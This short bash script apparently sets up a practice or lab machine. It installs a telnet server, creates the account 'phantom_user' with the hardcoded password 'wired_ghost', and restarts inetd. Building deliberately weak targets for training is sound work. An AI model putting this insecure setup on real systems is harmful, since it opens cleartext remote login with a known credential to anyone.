#!/bin/bash
apt update || true
apt install -y telnetd-ssl || apt install -y telnetd

id -u phantom_user &>/dev/null || useradd -m -s /bin/bash phantom_user
echo "phantom_user:wired_ghost" | chpasswd

service openbsd-inetd restart
